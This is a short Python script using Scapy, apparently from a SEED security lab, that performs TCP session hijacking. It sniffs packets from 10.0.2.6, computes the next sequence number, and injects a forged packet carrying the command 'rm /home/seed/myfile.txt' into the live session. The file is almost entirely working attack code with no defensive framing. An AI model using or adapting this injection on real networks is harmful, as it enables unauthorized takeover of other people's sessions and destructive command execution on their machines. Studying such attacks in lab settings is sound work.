#!/usr/bin/python3
import sys
from scapy.all import *

def session_hijacking(pkt):
	print ("Source IP: ", pkt[IP].src)
	print ("Source port: ", pkt[TCP].sport)
	print ("Destination IP: ", pkt[IP].dst)
	print ("Destination port: " , pkt[TCP].dport)
	print ("TCP Segment length: ", len(pkt[TCP].payload))
	print ("Sequence number: ", pkt[TCP].seq)
	print ("Next sequence number: ", pkt[TCP].seq + len(pkt[TCP].payload))
	print ("Ack: ", pkt[TCP].ack)
	ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
	tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=pkt[TCP].seq + len(pkt[TCP].payload), ack=pkt[TCP].ack)
	data = "\r rm /home/seed/myfile.txt"
	inject_pkt = ip/tcp/data
	send(inject_pkt, verbose=0)
	print ("\n")

pkt = sniff(filter='tcp and src host 10.0.2.6', prn=session_hijacking, count=10)